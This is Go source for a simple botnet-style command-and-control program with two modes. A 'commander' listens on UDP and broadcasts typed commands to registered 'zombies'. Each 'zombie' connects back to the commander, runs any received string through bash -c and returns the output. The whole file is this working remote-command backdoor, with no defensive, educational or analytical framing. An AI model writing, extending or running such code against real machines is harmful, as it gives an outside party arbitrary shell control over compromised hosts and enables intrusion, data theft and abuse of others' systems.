package main

import (
	"bufio"
	"fmt"
	"log"
	"net"
	"os"
	"os/exec"
	"sync"
	// "time"
)

const (
	mode = "tcp"
	maxZombies = 5
)

var endConnection = false
var messageToSend = make(chan []byte)
var zombies = make(map[*net.UDPAddr]int)

func main() {

	if len(os.Args) == 3 {
		service := os.Args[1]
		if service == "commander" {
			handleCommander(os.Args[2])
		} else if service == "zombie" {
			handleZombie(os.Args[2])
		} else {
			log.Println("Either be a commander or zombie, gotta choose one my dude")
		}
	} else {
		log.Println("Wrong format my dude")
	}

	os.Exit(0)
}

func handleCommander(port string) {
	wg := sync.WaitGroup{}
	udpAddr, err := net.ResolveUDPAddr("udp4", port)
	checkError(err)

	conn, err := net.ListenUDP("udp", udpAddr)
	checkError(err)
	for i := 0; i < maxZombies; i++ {
		wg.Add(1)
		go func() {
		for {
			handleReceivedMessage(conn)
		}
		wg.Done()
		fmt.Println("Done")
		}()
	}

	wg.Add(1)
	go func() {
		for {
			handleSendCommand(conn)
		}
		wg.Done()
	}()

	wg.Wait()
}

func handleZombie(service string) {
	wg := sync.WaitGroup{}
	// Binding process
	udpAddr, err := net.ResolveUDPAddr("udp4", service)
	checkError(err)
	// currAddress = udpAddr
	// Creating a connection, essentially connect()
	conn, err := net.DialUDP("udp", nil, udpAddr)
	checkError(err)

	_, err = conn.Write([]byte("Connection established"))
	checkError(err)

	wg.Add(1)
	go func() {
		for {
			handleRunCommand(conn)
		}
		wg.Done()
	}()

	wg.Add(1)
	go func() {
		for {
			select{
			case message := <-messageToSend:
				conn.Write(message)
			}
		}
		wg.Done()
	}()

	// Print result
	wg.Wait()
}

func handleRunCommand(conn *net.UDPConn) {
	var buf [512]byte

	n, _, err := conn.ReadFromUDP(buf[0:])
	checkError(err)
	command := string(buf[0:n])
	out, _ := exec.Command("bash", "-c", string(command)).Output()
	messageToSend <- out
}

func handleReceivedMessage(conn *net.UDPConn) {
	var buf [512]byte

	n, addr, err := conn.ReadFromUDP(buf[0:])
	if err != nil {
		return
	}
	zombies[addr] = 1
	message := string(buf[0:n])
	fmt.Println("From ", addr, ": \n", message)
}

func handleSendCommand(conn *net.UDPConn) {
	reader := bufio.NewReader(os.Stdin)
	for {
		message, err := reader.ReadBytes('\n')
		checkError(err)
		messSTR := string(message) + "\n"
		// Write request
		sendToEveryone([]byte(messSTR), conn)
	}
}

func sendToEveryone(message []byte, conn *net.UDPConn) {
	for k, _ := range zombies {
		handleWrite(conn, k, message)
	}
}

func handleWrite(conn *net.UDPConn, addr *net.UDPAddr, message []byte) {
	_, err := conn.WriteToUDP(message, addr)
	fmt.Println(err)
	checkError(err)
	return
}

func checkError(err error) {
	if err != nil {
		log.Println(os.Stderr, "Fatal error: %s", err.Error())
		os.Exit(1)
	}
}